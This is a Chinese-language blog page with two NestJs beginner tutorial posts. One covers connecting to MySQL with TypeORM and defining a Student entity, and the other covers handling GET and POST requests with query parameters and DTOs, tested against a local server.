<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">



  <meta name="google-site-verification" content="vz1PrlmOl-C4FBrH_at-JOEneuzGOz7AfXa3QVThvy8">








  <meta name="baidu-site-verification" content="code-4IMpMXQpb6">







  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">



  <link rel="icon" type="image/png" sizes="32x32" href="/img/favicon.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/img/favicon.ico?v=5.1.4">






  <meta name="keywords" content="gdccwxx">










<meta name="description" content="个人博客分享，热爱生活，热爱探索">
<meta property="og:type" content="website">
<meta property="og:title" content="gdccwxx">
<meta property="og:url" content="https://blog.gdccwxx.com/index.html">
<meta property="og:site_name" content="gdccwxx">
<meta property="og:description" content="个人博客分享，热爱生活，热爱探索">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="gdccwxx">
<meta name="twitter:description" content="个人博客分享，热爱生活，热爱探索">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_header":"slideDownIn","post_body":"slideDownIn"}},
    duoshuo: {
      userId: 'undefined',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://blog.gdccwxx.com/">





  <title>gdccwxx - :)</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-118405225-1', 'auto');
  ga('send', 'pageview');
</script>





</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">gdccwxx</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">:)</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/nestJs/nest-js-tutorial-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/nestJs/nest-js-tutorial-3/" itemprop="url">NestJs 入门教程之三：数据库</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-09-12T17:16:56+08:00">
                2021-09-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>这个系列的<a href="/nestJs/nest-js-tutorial-2/" title="上一篇">上一篇</a>文章，实现了 <code>Post</code> 接口和对接口的基础操作。</p>
<p>本篇主要讲的是和数据库连接，使用数据库联表查询和操作记录。使用数据库将数据记录，就是一个完整的后台服务了。</p>
<p>完整示例可以在 <a href="https://github.com/gdccwxx/nest-test" target="_blank" rel="noopener">github</a> 找到。</p>
<p><img src="/nestJs/nest-js-tutorial-3/./nestjs.png" alt="nestjs"></p>
<p>本篇使用 <code>mysql</code> 作为数据库连接。使用 <code>NestJs</code> 内置的<a href="https://docs.nestjs.com/techniques/database" target="_blank" rel="noopener">数据库连接</a> <code>typeorm</code>，可在 <a href="https://typeorm.io/" target="_blank" rel="noopener">这里</a> 查阅 typeorm 详细文档</p>
<h1 id="一、开发准备"><a href="#一、开发准备" class="headerlink" title="一、开发准备"></a>一、开发准备</h1><ol>
<li><a href="https://dev.mysql.com/downloads/mysql/" target="_blank" rel="noopener">下载</a>并安装 Mysql</li>
<li><p>创建 school 库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database school;</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装 @nestjs/typeorm typeorm mysql2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save @nestjs/typeorm typeorm mysql2</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="二、数据库连接"><a href="#二、数据库连接" class="headerlink" title="二、数据库连接"></a>二、数据库连接</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.module.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Module &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; AppController &#125; <span class="keyword">from</span> <span class="string">'./app.controller'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; AppService &#125; <span class="keyword">from</span> <span class="string">'./app.service'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StudentsController &#125; <span class="keyword">from</span> <span class="string">'./students/students.controller'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; TypeOrmModule &#125; <span class="keyword">from</span> <span class="string">'@nestjs/typeorm'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  imports: [</span><br><span class="line">    StudentsModule,</span><br><span class="line">    TypeOrmModule.forRoot(&#123;</span><br><span class="line">      <span class="keyword">type</span>: <span class="string">'mysql'</span>,</span><br><span class="line">      host: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">      port: <span class="number">3306</span>,</span><br><span class="line">      username: <span class="string">'root'</span>,</span><br><span class="line">      password: <span class="string">'1qaz2wsx'</span>,</span><br><span class="line">      database: <span class="string">'school'</span>,</span><br><span class="line">      autoLoadEntities: <span class="literal">true</span>,</span><br><span class="line">      synchronize: <span class="literal">true</span>, <span class="comment">// 数据库自动同步 entity 文件修改</span></span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  controllers: [AppController],</span><br><span class="line">  providers: [AppService],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> AppModule &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>初始化数据库连接。</p>
<p><code>autoLoadEntities</code> 自动化 load entity 文件, 所有在 Module 中引用的 Entity 文件会被自动加载。自动加载设置为 true 即可。</p>
<p><code>synchronize</code> 自动化同步表，本地可自动打开，线上数据库不建议打开。</p>
<h1 id="三、定义表结构"><a href="#三、定义表结构" class="headerlink" title="三、定义表结构"></a>三、定义表结构</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    Entity,</span><br><span class="line">    Column,</span><br><span class="line">    PrimaryGeneratedColumn,</span><br><span class="line">    UpdateDateColumn,</span><br><span class="line">    CreateDateColumn,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">'typeorm'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> Student &#123;</span><br><span class="line">  <span class="meta">@PrimaryGeneratedColumn</span>()</span><br><span class="line">  id: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>(&#123; <span class="keyword">type</span>: <span class="string">'varchar'</span> &#125;)</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@UpdateDateColumn</span>()</span><br><span class="line">  updateDate: <span class="built_in">Date</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@CreateDateColumn</span>()</span><br><span class="line">  createDate: <span class="built_in">Date</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>@Entity</code> 注解代表是数据库入口文件；</li>
<li><code>@Column</code> 是基础列文件，使用 <code>type</code> 字段定义在数据库实际存储</li>
<li><code>@PrimaryGeneratedColumn</code> 代表单调递增的主键</li>
<li><code>@UpdateDateColumn</code> 当记录修改时会修改时间</li>
<li><code>@CreateDateColumn</code> 当记录新增时会写入时间</li>
</ul>
<h1 id="四、引用表"><a href="#四、引用表" class="headerlink" title="四、引用表"></a>四、引用表</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.module.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Module &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Student &#125; <span class="keyword">from</span> <span class="string">'./entities/students.entity'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; TypeOrmModule &#125; <span class="keyword">from</span> <span class="string">'@nestjs/typeorm'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StudentsController &#125; <span class="keyword">from</span> <span class="string">'./students.controller'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StudentsService &#125; <span class="keyword">from</span> <span class="string">'./students.service'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">    imports: [TypeOrmModule.forFeature([Student])],</span><br><span class="line">    providers: [StudentsService, Student],</span><br><span class="line">    controllers: [StudentsController],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsModule &#123;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>imports</code> 引用 typeorm 模块， entity 才可以在 service 中使用</li>
<li><code>providers</code> service 的 constructor 需要引用哪些模块</li>
<li><code>controllers</code> 模块的 controller</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.service.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Injectable, Logger &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; InjectRepository &#125; <span class="keyword">from</span> <span class="string">'@nestjs/typeorm'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Repository &#125; <span class="keyword">from</span> <span class="string">'typeorm'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Student &#125; <span class="keyword">from</span> <span class="string">'./entities/students.entity'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        <span class="meta">@InjectRepository</span>(Student)</span></span><br><span class="line"><span class="params">        <span class="keyword">private</span> readonly studentRepository: Repository&lt;Student&gt;,</span></span><br><span class="line"><span class="params">    </span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样会在 db 中建立 students 新表。</p>
<p>使用 <code>show create table</code> 能看表的详细信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use school;</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">// =&gt; | student | CREATE TABLE `student` (</span><br><span class="line">//  `id` int NOT NULL AUTO_INCREMENT,</span><br><span class="line">//  `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),</span><br><span class="line">//  `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),</span><br><span class="line">//  `name` varchar(255) NOT NULL,</span><br><span class="line">//  PRIMARY KEY (`id`)</span><br><span class="line">// ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci |</span><br></pre></td></tr></table></figure>
<h1 id="五、与数据库交互"><a href="#五、与数据库交互" class="headerlink" title="五、与数据库交互"></a>五、与数据库交互</h1><p>到这一步，终于可以和数据库进行交互了。基本上和数据库交互的部分都会放在 service 层，因此 <code>新增</code> 和 <code>查询</code> 都放在 service 层。</p>
<p>其中包括了</p>
<ul>
<li><code>getStudentName</code> 的改造</li>
<li><code>setStudent</code> 函数的新增</li>
</ul>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.service.ts</span></span><br><span class="line"><span class="comment">// import ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    <span class="comment">// logger, constructor ImStudent getStudentName ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> getStudentName(id: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logger.log(<span class="string">`get student id is <span class="subst">$&#123;id&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">const</span> results = <span class="keyword">await</span> <span class="keyword">this</span>.studentRepository.find(&#123; id &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> results ?? <span class="string">'not found'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> setStudent(name: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> results = <span class="keyword">this</span>.studentRepository.create(&#123; name &#125;);</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过使用 <code>find</code> 和 <code>create</code> 对学生查询和创建。结果也是异步的。</p>
<p>下面对 <code>controller</code> 进行改造，使得函数调用串起来。</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.controller.ts</span></span><br><span class="line"><span class="comment">// import ...</span></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">'students'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="comment">// constructor whoAreYou whoAreYouPost whoIsReq ..</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Get</span>(<span class="string">'get-name-by-id'</span>)</span><br><span class="line">    getNameById(<span class="meta">@Query</span>(<span class="string">'id'</span>, ParseIntPipe) id: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.getStudentName(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Post</span>(<span class="string">'set-student-name'</span>)</span><br><span class="line">    setStudentName(<span class="meta">@User</span>() user: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.setStudent(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过对 <code>service</code> 的调用, 再经调用调用产生如下结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 命令行访问</span><br><span class="line">curl -X POST http://127.0.0.1:3000/students/<span class="built_in">set</span>-student-name -H <span class="string">'Content-Type: application/json'</span> -d <span class="string">'&#123;"user": "gdccwxx"&#125;'</span></span><br><span class="line">// =&gt; &#123;<span class="string">"name"</span>:<span class="string">"gdccwxx"</span>,<span class="string">"id"</span>:1,<span class="string">"updateDate"</span>:<span class="string">"2021-09-12T15:57:14.599Z"</span>,<span class="string">"createDate"</span>:<span class="string">"2021-09-12T15:57:14.599Z"</span>&#125;%  ✅</span><br><span class="line"></span><br><span class="line">// 浏览器访问</span><br><span class="line">http://localhost:3000/students/get-name-by-id?id=1</span><br><span class="line"></span><br><span class="line">// =&gt; [&#123;</span><br><span class="line">//  id: 1,</span><br><span class="line">//  name: <span class="string">"gdccwxx"</span>,</span><br><span class="line">//  updateDate: <span class="string">"2021-09-12T15:57:14.599Z"</span>,</span><br><span class="line">//  createDate: <span class="string">"2021-09-12T15:57:14.599Z"</span></span><br><span class="line">// &#125;]  ✅</span><br></pre></td></tr></table></figure>
<p>通过对 <code>service</code> 的 save、find 调用，就能将数据完整存入数据库了。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/nestJs/nest-js-tutorial-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/nestJs/nest-js-tutorial-2/" itemprop="url">NestJs 入门教程之二：处理请求</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-09-12T10:06:06+08:00">
                2021-09-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>这个系列的<a href="/nestJs/nest-js-tutorial-1/" title="上一篇">上一篇</a>文章，教大家写了 hello world 和 新建 students 模块。</p>
<p>但是，那只是很干的 Get 请求。接着往下讲，如何给接口做参数检查、添加日志和使用 Post 方法。</p>
<p>完整示例可以在 <a href="https://github.com/gdccwxx/nest-test" target="_blank" rel="noopener">github</a> 找到。</p>
<p><img src="/nestJs/nest-js-tutorial-2/./nestjs.png" alt="nestjs"></p>
<h1 id="一、Post-请求"><a href="#一、Post-请求" class="headerlink" title="一、Post 请求"></a>一、Post 请求</h1><p>经过上篇的介绍，总体请求先会经过 students.controller.ts -&gt; 再到 students.service.ts。</p>
<p>在 students.service.ts 上新增 <code>Post</code> 方法<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.service.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Controller, Get, Post &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">'students'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// @Get('who-are-you') ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Post</span>(<span class="string">'who-are-you'</span>)</span><br><span class="line">    whoAreYouPost() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.ImStudent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过 curl 访问地址<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST  http://127.0.0.1:3000/students/who-are-you</span><br><span class="line">// =&gt; Im student% ✅</span><br></pre></td></tr></table></figure></p>
<p>通过替换装饰器，就可以快速实现 <code>Post</code> 请求。</p>
<h1 id="二、请求参数"><a href="#二、请求参数" class="headerlink" title="二、请求参数"></a>二、请求参数</h1><p>正常请求都会加上参数，<code>Get</code> 和 <code>Post</code> 方法加参数略有不同。</p>
<p>先看 Get 请求</p>
<h2 id="Get-请求参数"><a href="#Get-请求参数" class="headerlink" title="Get 请求参数"></a>Get 请求参数</h2><p>Get 请求的参数一般会放在 URL 上，这是 <code>@Query</code> 装饰器就派上用场了。</p>
<p>先改造 controller</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.controller.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Controller, Get, Post, Query &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">'students'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Get</span>(<span class="string">'who-are-you'</span>)</span><br><span class="line">    whoAreYou(<span class="meta">@Query</span>(<span class="string">'name'</span>) name: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.ImStudent(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再改造 service</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.service.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Injectable &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    ImStudent(name?: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Im student '</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过浏览器访问 url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/students/who-are-you?name=gdccwxx</span><br><span class="line">// =&gt; Im student gdccwxx  ✅</span><br></pre></td></tr></table></figure></p>
<p>这样 Get 请求就能获取到 name 参数了</p>
<h2 id="Post-参数"><a href="#Post-参数" class="headerlink" title="Post 参数"></a>Post 参数</h2><p>Post 参数有些不同，会用到 <a href="https://baike.baidu.com/item/DTO/16016821" target="_blank" rel="noopener">DTO</a> 的传输。因为数据通过 HTTP 传输是文本类型，因此需要将文本类型转化成代码可识别的变量。</p>
<p>新建 students.dto.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/students/dtos/students.dto.ts</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentDto &#123;</span><br><span class="line">    name: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
